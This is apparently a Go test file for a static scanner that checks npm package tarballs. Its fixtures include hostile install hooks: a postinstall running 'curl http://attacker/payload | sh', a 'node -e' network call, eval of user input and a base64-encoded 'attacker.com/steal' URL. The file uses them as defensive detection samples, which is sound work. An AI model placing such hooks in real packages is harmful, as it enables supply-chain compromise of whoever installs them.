package gate

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"io"
	"strings"
	"testing"
)

type stubTarball struct {
	url      string
	contents []byte
	urlErr   error
	fetchErr error
}

func (s stubTarball) TarballURL(context.Context, string, string) (string, error) {
	return s.url, s.urlErr
}

func (s stubTarball) FetchTarball(_ context.Context, _ string, dst io.Writer) error {
	if s.fetchErr != nil {
		return s.fetchErr
	}
	_, err := dst.Write(s.contents)
	return err
}

// buildTarball assembles a fake npm tarball (gzipped tar) from a
// path → content map. npm tarballs use a leading "package/" prefix.
func buildTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for name, content := range files {
		hdr := &tar.Header{
			Name:     "package/" + name,
			Mode:     0o644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	tw.Close()
	gz.Close()
	return buf.Bytes()
}

func TestStaticScan_ApprovesCleanPackage(t *testing.T) {
	tarball := buildTarball(t, map[string]string{
		"package.json": `{"name":"clean","version":"1.0.0"}`,
		"index.js":     "module.exports = function (a, b) { return a + b; };",
	})
	s := &StaticScan{
		NPM:      stubTarball{url: "x", contents: tarball},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "clean", Version: "1.0.0"})
	if r.Verdict != VerdictApprove {
		t.Errorf("clean package should Approve, got %v: %q\n%s", r.Verdict, r.Reason, r.Detail)
	}
}

func TestStaticScan_BlocksCurlPipeShellInPostinstall(t *testing.T) {
	tarball := buildTarball(t, map[string]string{
		"package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://attacker/payload | sh"}}`,
	})
	s := &StaticScan{
		NPM:      stubTarball{url: "x", contents: tarball},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "evil", Version: "1.0.0"})
	if r.Verdict != VerdictBlock {
		t.Errorf("curl|sh in postinstall should Block, got %v: %q\n%s", r.Verdict, r.Reason, r.Detail)
	}
}

func TestStaticScan_BlocksNodeEvalInPostinstall(t *testing.T) {
	tarball := buildTarball(t, map[string]string{
		"package.json": `{"name":"e","version":"1.0.0","scripts":{"postinstall":"node -e 'require(\"https\").get(...)'"}}`,
	})
	s := &StaticScan{
		NPM:      stubTarball{url: "x", contents: tarball},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "e", Version: "1.0.0"})
	if r.Verdict != VerdictBlock {
		t.Errorf("node -e in postinstall should Block, got %v", r.Verdict)
	}
}

func TestStaticScan_WarnsOnEvalDynamic(t *testing.T) {
	jsCode := "var x = userInput; eval(x);"
	tarball := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.0"}`,
		"index.js":     jsCode,
	})
	s := &StaticScan{
		NPM:      stubTarball{url: "x", contents: tarball},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.0"})
	if r.Verdict == VerdictApprove {
		t.Errorf("eval(<dynamic>) should not Approve, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestStaticScan_FlagsBase64EncodedURL(t *testing.T) {
	// "aHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWw" is base64 of
	// "https://attacker.com/steal".
	jsCode := `const url = "aHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWxBQ==";`
	tarball := buildTarball(t, map[string]string{
		"package.json": `{"name":"p","version":"1.0.0"}`,
		"index.js":     jsCode,
	})
	s := &StaticScan{
		NPM:      stubTarball{url: "x", contents: tarball},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "p", Version: "1.0.0"})
	if r.Verdict == VerdictApprove {
		t.Errorf("base64-encoded URL should not Approve, got %v\n%s", r.Verdict, r.Detail)
	}
}

func TestShannonEntropy(t *testing.T) {
	// All zeros: 0 entropy
	if h := shannonEntropy([]byte{0, 0, 0, 0, 0, 0, 0, 0}); h != 0 {
		t.Errorf("zeros: got %f, want 0", h)
	}
	// Uniform random-ish: ~3 bits for 8 distinct values
	if h := shannonEntropy([]byte{1, 2, 3, 4, 5, 6, 7, 8}); h < 2.5 || h > 3.5 {
		t.Errorf("8 distinct: got %f, want ~3", h)
	}
}

func TestStaticScan_UnknownOnTarballFailure(t *testing.T) {
	s := &StaticScan{
		NPM:      stubTarball{urlErr: io.EOF},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "x", Version: "1.0.0"})
	if r.Verdict != VerdictUnknown {
		t.Errorf("tarball url error should Unknown, got %v", r.Verdict)
	}
}

func TestStaticScan_ApprovesRealisticLodash(t *testing.T) {
	// Approximation of lodash's surface: no install scripts,
	// no eval, no spawn. Should approve cleanly.
	tarball := buildTarball(t, map[string]string{
		"package.json": `{"name":"lodash","version":"4.17.21","license":"MIT"}`,
		"add.js":       "module.exports = function add(a, b) { return a + b; };",
		"lodash.js":    strings.Repeat("function noop() { return; }\n", 200),
	})
	s := &StaticScan{
		NPM:      stubTarball{url: "x", contents: tarball},
		MaxBytes: 10 << 20, BlockAt: 3, WarnAt: 1,
	}
	r := s.Check(context.Background(), PackageRef{Ecosystem: "npm", Name: "lodash", Version: "4.17.21"})
	if r.Verdict != VerdictApprove {
		t.Errorf("realistic clean package should Approve, got %v: %q\n%s", r.Verdict, r.Reason, r.Detail)
	}
}
